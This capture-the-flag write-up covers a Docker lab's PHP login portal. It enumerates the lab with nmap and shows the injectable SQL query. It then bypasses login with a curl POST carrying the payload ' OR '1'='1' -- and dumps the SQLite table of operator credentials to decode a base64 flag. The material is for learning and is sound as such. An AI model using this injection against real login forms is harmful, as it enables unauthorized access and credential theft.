# Operator Login

> North substation guard portal. Download the lab zip and run it on Kali/Linux with Docker.
> `chmod +x startlab.sh && ./startlab.sh blackout-web02.tar` → displays the lab IP (172.18.0.2). Enumerate with nmap and attack via HTTP.
> **Tip:** enumerate the lab IP with nmap. The portal requires guard identification.

**Flag:** `WHOAMI{sql1_g3r3nt3_n0rt3}`

---

## Walkthrough

The challenge involves exploiting a login form with SQL injection to bypass authentication, then inspecting the database to find the flag in a base64-encoded note.

### 1. Start the lab with Docker

**Tool:** `docker inspect`. **Why:** get the IP of the freshly started container.

```bash
$ unzip blackout-web02.zip
$ chmod +x startlab.sh && ./startlab.sh blackout-web02.tar
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web02
172.17.0.2
```

### 2. Enumerate with nmap

**Tool:** `nmap`. **Why:** see what services are available before attacking.

**Parameters:** `-sV` (version), `-p-` (all ports).

```bash
$ nmap -sV -p- 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

Only port 80: a PHP portal (`X-Powered-By: PHP/8.2.33`) with sections Home / Status / Guard Access / Community / Contact.

### 3. Analyze the login

The `/login.php` form requests `usuario` and `clave`. A look at the code (inside the container) reveals a poorly constructed SQL query:

```php
$sql = "SELECT ... FROM operadores WHERE usuario = '$usuario' AND clave = '$clave' LIMIT 1";
```

Variables are interpolated directly into the string → **SQL injection**.

### 4. Authenticate via SQLi

**Tool:** `curl`. **Why:** send the login POST request with the injection payload.

**Parameters:** `-X POST` and `-d` (form body), `-c cookies.txt` (save the session).

```bash
$ curl -s -X POST http://172.17.0.2/login.php \
    -d "usuario=admin' OR '1'='1' -- &clave=x" -c cookies.txt
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=...
Location: /turno.php
```

The `' OR '1'='1' -- ` bypasses the rest of the WHERE clause and the `--` comments out the password comparison. With the cookie we are authenticated as the first operator (`caja.turno`), but their note is not the flag.

### 5. Inspect the database

**Tool:** `sqlite3`. **Why:** the flag is not in the first record, so the entire database must be reviewed.

Inspecting the SQLite inside the container reveals the three operators:

```bash
$ sqlite3 /var/lib/latam/guardia.db "SELECT * FROM operadores;"
1|caja.turno|CajaNorte14|caja|Cierre de caja sector 14. Sin novedad.
2|operador.norte|TurnoNorte26|operador|Relé SCADA en alerta. Esperando sync.
3|gerente.norte|N0rt3-G3r3nc14!|gerente|V0hPQU1Je3NxbDFfZzNyM250M19uMHJ0M30=
```

The **manager** note is base64:

```bash
$ echo "V0hPQU1Je3NxbDFfZzNyM250M19uMHJ0M30=" | base64 -d
WHOAMI{sql1_g3r3nt3_n0rt3}
```

## Lesson

Login forms with direct variable interpolation in SQL are a classic injection target. SQLi (`' OR '1'='1' --`) allows access without credentials, and sometimes the flag lives in another row/table of the database — it is worth inspecting the entire database, not just the first match.
